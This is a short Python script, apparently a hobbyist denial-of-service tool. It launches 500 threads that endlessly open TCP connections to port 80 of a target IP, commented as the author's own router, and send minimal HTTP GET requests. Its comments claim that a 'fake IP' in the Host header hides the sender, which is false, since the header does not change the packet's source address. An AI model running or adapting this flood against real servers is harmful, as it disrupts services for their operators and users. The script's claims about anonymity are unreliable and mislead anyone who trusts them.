import socket
import threading


TARGET = '192.168.7.1' # (attacking my router)
PORT = 80 # taking down pages on the internet (port 80)
FAKE_IP = '182.21.20.32' # to "hide" my ip.


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))
        s.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
        s.sendto(("Host: " + FAKE_IP + "\r\n\r\n").encode('ascii'), (TARGET, PORT))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()